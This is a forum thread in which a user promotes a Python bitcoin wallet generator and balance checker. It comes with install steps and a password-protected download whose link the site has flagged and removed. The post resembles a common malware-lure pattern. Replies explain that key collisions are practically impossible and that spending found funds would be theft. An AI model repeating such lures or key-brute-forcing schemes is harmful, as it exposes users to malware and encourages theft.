title: Kost21
author: Kost21
content: I found on a GitHub software, wthich can very fast generate btc wallets and check balances.Fully works on a Python1. You need to install it for official site ( IMPORTANT Leave mark in a "Install to PATH" place )1. Run "Install modules"2. If all good run "Update"2.1. If you have error try again ( for all parts )3. Run "Start"That's all!https://prnt.sc/al7i1w6co5qiIf you have a question you can ask meI want to remake this script to another same, can sb helps?Download link: https://[Suspicious link removed]/3NL8VSp        Pass: 123

comments.author: BitMaxz
comments.body: This is not the right place to fool around you maybe try it on another forum. Based on your image it generates only one address with one seed phrase. The seed phrase contains a huge amount of public keys and private keys, not just one.

comments.author: NotATether
comments.body: I'll just say what has been said before in many old threads:The chances of generating even a used address/private key, out of the set of (approximately) 2^256 possible private keys, is nil.You are talking about some several million addresses used (2^20something) against 2^256 keys. That's not even counting the chance of generating an address that is used AND still has BTC in it. So stop wasting your time with such projects.

comments.author: NeuroticFish
comments.body: I find this kind of tools very important for newbies, with a couple of notes:* this kind of tool will show you how small is the chance for getting an address collision; one has bigger chance to win lotto many week-ends in a row than getting a collision; still newbies may want to see for themselves* if one tries to use this kind of tool he has to be aware that he will consume electricity that costs money* if (by incredible luck) one finds a collision he should think very good if he indeed wants to spend that money (since that would be stealing)
